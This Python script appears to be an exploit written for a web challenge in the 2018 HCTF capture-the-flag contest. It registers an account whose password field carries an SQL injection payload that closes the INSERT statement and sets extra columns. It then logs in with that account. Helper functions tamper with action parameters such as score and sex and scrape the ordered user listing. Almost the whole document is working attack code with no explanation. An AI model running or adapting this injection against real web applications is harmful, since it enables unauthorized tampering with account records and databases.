import requests as req


URL = 'http://game.2018.hctf.io/web2/'
cookies = {
    "PHPSESSID": "vvvvvv"
}
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac \
    OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) \
    Chrome/66.1.3527.300 Safari/524.63",
}


def reg(u, s=9, pwd="vvv"):
    data = {
        "username": u,
        "password": pwd,
        "sex": s,
        "submit": "submit"
    }
    res = req.post(URL+'action.php?action=reg',
                   headers=headers, cookies=cookies, data=data)
    print(res.content.decode('utf-8'))


def login(u, pwd):
    data = {
        "username": u,
        "password": pwd,
        "submit": "submit"
    }
    res = req.post(URL+'action.php?action=login',
                   headers=headers, cookies=cookies, data=data)
    print(res.content.decode('utf-8'))


def user(o="2"):
    res = req.get(URL+'user.php?order=%s' % o,
                  headers=headers, cookies=cookies)
    if res.status_code == 200:
        html = res.content.decode('utf-8')
        html = html.replace('\t', '').replace('\n', '') \
            .replace('<tr>', '\t').replace('</tr>', '\t') \
            .replace('<td>', '\t').replace('</td>', '\t')
        pos = html.find('_vvv')
        return html[pos-10:pos+20]


def set(a="score", v="98765"):
    print('action.php?action=%s&%s=%s' % (a, a, v))
    res = req.get(URL+'action.php?action=%s&%s=%s' % (a, a, v),
                  headers=headers, cookies=cookies)


if __name__ == '__main__':
    pwd = "vvv',9,9);#"
    pl = "_v"
    reg(pl, pwd=pwd)
    login("_vvv", pwd=pwd)
    # set("sex", "0")
    # res = user('2')
    # print(res)
